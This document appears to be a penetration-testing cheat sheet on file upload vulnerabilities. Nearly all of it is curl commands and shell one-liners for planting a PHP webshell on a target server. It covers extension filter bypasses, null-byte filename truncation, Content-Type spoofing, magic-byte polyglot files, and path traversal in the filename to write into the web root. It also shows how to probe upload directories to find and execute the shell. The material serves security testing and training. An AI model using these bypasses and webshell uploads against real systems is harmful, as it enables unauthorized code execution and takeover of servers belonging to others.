# File Upload Vulnerabilities

## Fastest First-Pass Checklist

```bash
# Purpose: baseline — upload a legitimate file, note where it's stored/served from
curl -s -F "file=@legit.jpg" https://target.example/upload

# Purpose: try uploading a webshell with the true extension first (no bypass) to confirm filtering exists at all
curl -s -F "file=@shell.php" https://target.example/upload
```

## Technique: Extension Filter Bypass

**When to use it**: server rejects `.php`/`.jsp`/`.asp` by extension check
but doesn't validate content.

**Fast path** (bypass candidates):
```bash
# Purpose: alternate extensions some servers still execute (Apache multi-extension handling, case-sensitivity)
cp shell.php shell.phP
cp shell.php shell.pht
cp shell.php shell.phtml
cp shell.php "shell.php.jpg"     # double extension — some parsers use the last, others the server config executes first match

# Purpose: null-byte truncation (legacy PHP <5.3.4) — server "sees" allowed ext, filesystem writes true one
curl -s -F "file=@shell.php%00.jpg;filename=shell.php%00.jpg" https://target.example/upload
```
**Indicators**: upload succeeds and the file is later reachable/executable
at a predictable path.

## Technique: Content-Type / Magic Byte Bypass

**When to use it**: server checks `Content-Type` header or file magic
bytes rather than (or in addition to) extension.

**Fast path**:
```bash
# Purpose: spoof Content-Type while uploading actual malicious content
curl -s -F "file=@shell.php;type=image/jpeg" https://target.example/upload

# Purpose: prepend valid image magic bytes before your payload (polyglot file)
(printf '\xFF\xD8\xFF\xE0'; cat shell.php) > shell.jpg.php
```
**Indicators**: server accepts the file because magic bytes/Content-Type
match an image, but a downstream include/execution path still treats it as
code (common when the app later does something like `include($uploaded_path)`).

## Technique: Path Traversal via Filename

**Fast path**:
```bash
# Purpose: if the filename itself is used to construct a save path, try traversal
curl -s -F "file=@shell.php;filename=../../var/www/html/shell.php" https://target.example/upload
```
**Indicators**: file lands outside the intended upload directory,
potentially into a web-executable path.

## Technique: Locating the Uploaded File

Uploading successfully is only half the challenge — you need to find where
it's served from:
```bash
# Purpose: check common upload storage paths directly
for p in uploads files media user_uploads static/uploads; do
    curl -s -o /dev/null -w "%{http_code} /$p/shell.jpg.php\n" "https://target.example/$p/shell.jpg.php"
done

# Purpose: the upload response itself often returns the stored path/filename directly
curl -s -F "file=@shell.php" https://target.example/upload | jq .
```

## Common Mistakes

- Stopping after a successful upload without confirming the file is
  actually reachable and executes — upload success ≠ code execution.
- Not trying polyglot files when both extension AND content-type/magic
  byte checks are present simultaneously — combine bypasses.
- Forgetting that some upload handlers rename files randomly — check the
  upload response body/headers for the assigned filename instead of
  guessing.
